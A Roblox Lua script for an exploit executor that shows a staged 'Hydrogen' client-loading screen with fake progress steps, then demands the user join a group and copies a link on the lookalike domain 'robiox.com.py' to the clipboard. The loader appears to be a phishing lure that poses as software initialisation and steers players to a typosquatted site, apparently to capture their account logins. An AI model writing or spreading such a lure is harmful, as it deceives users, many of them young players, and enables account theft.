
local GROUP_LINK = "https://www.robiox.com.py/communities/265368827221/Hydrogen"
local TITLE = "Hydrogen"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local parent = (gethui and gethui()) or CoreGui

local previous = parent:FindFirstChild("HydrogenUI")
if previous then
    previous:Destroy()
end

local function create(class, properties, parentObject)
    local object = Instance.new(class)
    for key, value in pairs(properties) do
        object[key] = value
    end
    object.Parent = parentObject
    return object
end

local function tween(object, duration, properties)
    local animation = TweenService:Create(
        object,
        TweenInfo.new(duration, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        properties
    )
    animation:Play()
    return animation
end

local gui = create("ScreenGui", {
    Name = "HydrogenUI",
    IgnoreGuiInset = true,
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling
}, parent)

local background = create("Frame", {
    Name = "Background",
    Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = Color3.fromRGB(5, 5, 10),
    BackgroundTransparency = 0.12,
    BorderSizePixel = 0
}, gui)

local window = create("Frame", {
    Name = "Window",
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.fromOffset(420, 260),
    BackgroundColor3 = Color3.fromRGB(13, 12, 21),
    BorderSizePixel = 0
}, background)

create("UICorner", {CornerRadius = UDim.new(0, 16)}, window)

create("UIStroke", {
    Color = Color3.fromRGB(110, 65, 210),
    Thickness = 1.2,
    Transparency = 0.25
}, window)

local scale = create("UIScale", {Scale = 0.85}, window)

local topLine = create("Frame", {
    Size = UDim2.new(1, 0, 0, 3),
    BackgroundColor3 = Color3.fromRGB(157, 91, 255),
    BorderSizePixel = 0
}, window)

create("UICorner", {CornerRadius = UDim.new(0, 16)}, topLine)

local logo = create("TextLabel", {
    Position = UDim2.fromOffset(26, 22),
    Size = UDim2.fromOffset(42, 42),
    BackgroundColor3 = Color3.fromRGB(39, 25, 65),
    Text = "H",
    TextColor3 = Color3.fromRGB(200, 163, 255),
    Font = Enum.Font.GothamBlack,
    TextSize = 25
}, window)

create("UICorner", {CornerRadius = UDim.new(0, 12)}, logo)

local title = create("TextLabel", {
    Position = UDim2.fromOffset(80, 22),
    Size = UDim2.new(1, -110, 0, 25),
    BackgroundTransparency = 1,
    Text = TITLE,
    TextColor3 = Color3.fromRGB(245, 240, 255),
    Font = Enum.Font.GothamBold,
    TextSize = 21,
    TextXAlignment = Enum.TextXAlignment.Left
}, window)

local subtitle = create("TextLabel", {
    Position = UDim2.fromOffset(81, 48),
    Size = UDim2.new(1, -110, 0, 18),
    BackgroundTransparency = 1,
    Text = "INITIALIZING ENVIRONMENT",
    TextColor3 = Color3.fromRGB(143, 130, 166),
    Font = Enum.Font.GothamMedium,
    TextSize = 9,
    TextXAlignment = Enum.TextXAlignment.Left
}, window)

local status = create("TextLabel", {
    Position = UDim2.fromOffset(27, 105),
    Size = UDim2.new(1, -54, 0, 22),
    BackgroundTransparency = 1,
    Text = "Preparing Hydrogen...",
    TextColor3 = Color3.fromRGB(219, 211, 235),
    Font = Enum.Font.GothamMedium,
    TextSize = 12,
    TextXAlignment = Enum.TextXAlignment.Left
}, window)

local percent = create("TextLabel", {
    AnchorPoint = Vector2.new(1, 0),
    Position = UDim2.new(1, -27, 0, 105),
    Size = UDim2.fromOffset(50, 22),
    BackgroundTransparency = 1,
    Text = "0%",
    TextColor3 = Color3.fromRGB(190, 148, 255),
    Font = Enum.Font.GothamBold,
    TextSize = 12,
    TextXAlignment = Enum.TextXAlignment.Right
}, window)

local barBack = create("Frame", {
    Position = UDim2.fromOffset(27, 136),
    Size = UDim2.new(1, -54, 0, 6),
    BackgroundColor3 = Color3.fromRGB(34, 29, 45),
    BorderSizePixel = 0
}, window)

create("UICorner", {CornerRadius = UDim.new(1, 0)}, barBack)

local bar = create("Frame", {
    Size = UDim2.new(0, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(169, 111, 255),
    BorderSizePixel = 0
}, barBack)

create("UICorner", {CornerRadius = UDim.new(1, 0)}, bar)

local footer = create("TextLabel", {
    Position = UDim2.new(0, 27, 1, -39),
    Size = UDim2.new(1, -54, 0, 17),
    BackgroundTransparency = 1,
    Text = "HYDROGEN  /  CLIENT INITIALIZATION",
    TextColor3 = Color3.fromRGB(91, 83, 107),
    Font = Enum.Font.GothamMedium,
    TextSize = 9,
    TextXAlignment = Enum.TextXAlignment.Left
}, window)

tween(scale, 0.5, {Scale = 1})

local loadingSteps = {
    {0.22, "Loading interface components..."},
    {0.46, "Initializing visual systems..."},
    {0.71, "Preparing client interface..."},
    {0.90, "Finalizing initialization..."},
    {1, "Initialization complete."}
}

for _, step in ipairs(loadingSteps) do
    task.wait(0.55)
    if not gui.Parent then return end

    status.Text = step[2]
    percent.Text = math.floor(step[1] * 100) .. "%"
    tween(bar, 0.5, {Size = UDim2.new(step[1], 0, 1, 0)})
end

task.wait(0.45)

if not gui.Parent then return end

tween(window, 0.35, {
    Size = UDim2.fromOffset(0, 0)
})

task.wait(0.4)

if not gui.Parent then return end

window.Size = UDim2.fromOffset(420, 285)

for _, child in ipairs(window:GetChildren()) do
    if child ~= topLine then
        child:Destroy()
    end
end

local function label(text, position, size, textSize, color, font)
    return create("TextLabel", {
        Position = position,
        Size = size,
        BackgroundTransparency = 1,
        Text = text,
        TextColor3 = color,
        Font = font or Enum.Font.Gotham,
        TextSize = textSize,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left
    }, window)
end

local function button(text, position, size, color)
    local b = create("TextButton", {
        Position = position,
        Size = size,
        BackgroundColor3 = color,
        Text = text,
        TextColor3 = Color3.fromRGB(250, 247, 255),
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        AutoButtonColor = false,
        BorderSizePixel = 0
    }, window)

    create("UICorner", {CornerRadius = UDim.new(0, 9)}, b)

    b.MouseEnter:Connect(function()
        tween(b, 0.15, {
            BackgroundColor3 = Color3.fromRGB(115, 70, 183)
        })
    end)

    b.MouseLeave:Connect(function()
        tween(b, 0.15, {
            BackgroundColor3 = color
        })
    end)

    return b
end

local icon = create("TextLabel", {
    Position = UDim2.fromOffset(27, 24),
    Size = UDim2.fromOffset(42, 42),
    BackgroundColor3 = Color3.fromRGB(39, 25, 65),
    Text = "H",
    TextColor3 = Color3.fromRGB(200, 163, 255),
    Font = Enum.Font.GothamBlack,
    TextSize = 25
}, window)

create("UICorner", {CornerRadius = UDim.new(0, 12)}, icon)

label("Access Required", UDim2.fromOffset(81, 24),
    UDim2.new(1, -110, 0, 25), 19,
    Color3.fromRGB(245, 240, 255), Enum.Font.GothamBold)

label("HYDROGEN MEMBERSHIP", UDim2.fromOffset(82, 49),
    UDim2.new(1, -110, 0, 17), 9,
    Color3.fromRGB(155, 133, 184), Enum.Font.GothamMedium)

local divider = create("Frame", {
    Position = UDim2.fromOffset(27, 83),
    Size = UDim2.new(1, -54, 0, 1),
    BackgroundColor3 = Color3.fromRGB(43, 35, 57),
    BorderSizePixel = 0
}, window)

label("You need to join our group to continue!",
    UDim2.fromOffset(27, 102),
    UDim2.new(1, -54, 0, 43), 14,
    Color3.fromRGB(233, 225, 246), Enum.Font.GothamSemibold)

label("Join the official group to access the next step.",
    UDim2.fromOffset(27, 145),
    UDim2.new(1, -54, 0, 24), 11,
    Color3.fromRGB(145, 132, 162), Enum.Font.Gotham)

local copyButton = button(
    "Copy Group Link",
    UDim2.fromOffset(27, 190),
    UDim2.new(1, -54, 0, 42),
    Color3.fromRGB(91, 54, 151)
)

local copyStatus = label(" ",
    UDim2.fromOffset(27, 240),
    UDim2.new(1, -54, 0, 18), 10,
    Color3.fromRGB(160, 220, 170), Enum.Font.GothamMedium)

copyButton.Activated:Connect(function()
    if type(setclipboard) == "function" then
        local success, err = pcall(setclipboard, GROUP_LINK)

        if success then
            copyStatus.Text = "Group link copied to clipboard."
            copyStatus.TextColor3 = Color3.fromRGB(160, 220, 170)
        else
            copyStatus.Text = "Clipboard error: " .. tostring(err)
            copyStatus.TextColor3 = Color3.fromRGB(255, 130, 130)
        end
    else
        copyStatus.Text = "Clipboard API unavailable in this environment."
        copyStatus.TextColor3 = Color3.fromRGB(255, 130, 130)
    end
end)

tween(window, 0.4, {
    Size = UDim2.fromOffset(420, 285)
})
